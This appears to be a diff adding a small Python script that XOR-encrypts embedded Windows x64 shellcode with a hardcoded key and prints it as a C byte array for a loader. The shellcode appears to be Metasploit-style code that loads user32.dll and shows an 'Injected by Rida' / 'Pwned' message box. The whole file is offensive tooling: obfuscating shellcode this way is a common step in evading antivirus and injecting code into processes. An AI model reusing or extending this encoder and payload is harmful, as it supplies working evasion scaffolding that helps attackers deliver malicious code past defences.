@@ -1,0 +1,15 @@
+def xor(data: bytes, key: bytes) -> bytes:
+    klen = len(key)
+    return bytes(b ^ key[i % klen] for i, b in enumerate(data))
+
+def to_c_array(data: bytes, varname: str, ctype="UCHAR") -> str:
+    hex_vals = ", ".join(f"0x{b:02x}" for b in data)
+    return f"{ctype} {varname}[] = {{ {hex_vals} }};"
+
+
+shellcode = bytes.fromhex("fc4881e4f0ffffffe8cc00000041514150524831d2515665488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed52488b522041518b423c4801d0668178180b020f85720000008b80880000004885c074674801d050448b40208b48184901d0e35648ffc9418b34884801d64d31c94831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5de80b0000007573657233322e646c6c005941ba4c772607ffd549c7c100000000e811000000496e6a65637465642062792052696461005ae80600000050776e65640041584831c941ba45835607ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5")
+key = b"rzdhop_is_a_nice_guy" 
+
+with open("payload.raw", "wb") as f:
+    print(to_c_array(xor(shellcode, key), "shellcode"))
+    #f.write(xor(shellcode, key))
